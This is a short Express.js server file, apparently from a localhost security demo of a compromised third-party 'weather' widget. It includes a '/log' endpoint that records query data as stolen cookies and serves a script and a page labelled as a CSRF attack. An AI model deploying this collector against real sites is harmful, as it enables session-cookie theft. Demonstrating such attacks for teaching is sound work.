const express = require("express");
const cors = require("cors");
const path = require("path");

const app = express();
const PORT = 5000;

const mode = process.argv.includes("--mode=breach1")
  ? "breach1"
  : "normal";

console.log("Weather mode:", mode);

app.use(cors());

// mode check
app.get("/mode", (req, res) => {
  res.json({ mode });
});

// steal log
app.get("/log", (req, res) => {
  const data = req.query.data;
  console.log("🔥 [ATTACKER] Stolen cookie:", data);
  res.sendStatus(200);
});

// serve JS
app.get("/weather.js", (req, res) => {
  res.sendFile(__dirname + "/weather.js");
});

// CSRF ATTACK PAGE
app.get("/weather-promo.html", (req, res) => {
  res.sendFile(__dirname + "/weather-promo.html");
});

app.listen(PORT, () => {
  console.log(`Weather server running on http://localhost:${PORT}`);
});